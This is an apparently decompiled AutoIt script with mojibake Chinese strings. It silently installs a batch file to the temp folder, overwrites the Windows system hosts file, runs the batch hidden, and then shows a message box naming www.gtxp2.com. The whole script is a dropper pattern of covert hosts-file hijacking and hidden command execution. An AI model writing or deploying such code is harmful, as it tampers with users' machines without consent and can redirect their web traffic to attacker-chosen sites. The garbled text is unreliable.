; <AUT2EXE VERSION: 3.2.4.9>
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-START: C:\Documents and Settings\Administrator\����\�½� AutoIt v3 Script (3).au3>
; ----------------------------------------------------------------------------
#NoTrayIcon
FileInstall("bat.bat", @TempDir&"\bat.bat",1)
FileInstall("hosts", "C:\WINDOWS\system32\drivers\etc\hosts",1)
RunWait(@TempDir&"\bat.bat","",@SW_HIDE)
MsgBox(4096, "www.gtxp2.com", "�̲�����Ƽ���ʾ���������!", 10)
; ----------------------------------------------------------------------------
; <AUT2EXE INCLUDE-END: C:\Documents and Settings\Administrator\����\�½� AutoIt v3 Script (3).au3>
; ----------------------------------------------------------------------------

